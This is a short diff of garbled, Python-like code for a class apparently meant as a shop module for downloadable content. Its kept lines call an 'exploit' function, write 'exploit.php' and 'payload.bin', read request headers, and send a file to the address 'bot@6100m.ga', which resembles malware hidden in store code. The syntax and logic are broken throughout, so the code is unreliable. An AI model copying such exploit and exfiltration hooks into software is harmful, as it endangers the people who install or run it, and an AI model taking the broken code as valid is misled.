@@ -1,9 +1,6 @@
 from ... import (
   shopsdk.digitalcontentsender
   shopsdk.install
-  shopsdk.orderphotos
-  shopsdk.orderprintful
-  shopsdk.setup
   shopsdk.utilsnotbyme
 )
 class GloomDLCShopItems(l, o, p, r, s, t):
@@ -13,7 +10,6 @@ class GloomDLCShopItems(l, o, p, r, s, t):
     m="bot@6100m.ga"
     w=a+50
     v=a+merch.gen.digitalcontentsender.returnnumber(8)
-    merch.gen.setup.setup(b)
     merch.gen.install.run(v, a, a, a, a, a, a, a, a, a)
     merch.gen.digitalcontentsender.send(l, m, str("a0014682.dat"), o, p, r)
     data=request.get_headers()
@@ -27,7 +23,6 @@ class GloomDLCShopItems(l, o, p, r, s, t):
     path=str(merch.gen.utilsnotbyme.getcurrentpath())
     m="bot@6100m.ga"
     w=a+75
-    merch.gen.setup.setup(b)
     merch.gen.utilsnotbyme.exploit(a, 1)
     file1=str(path)+"/"+"exploit.php"
     file2=str(path)+"/"+"payload.bin"
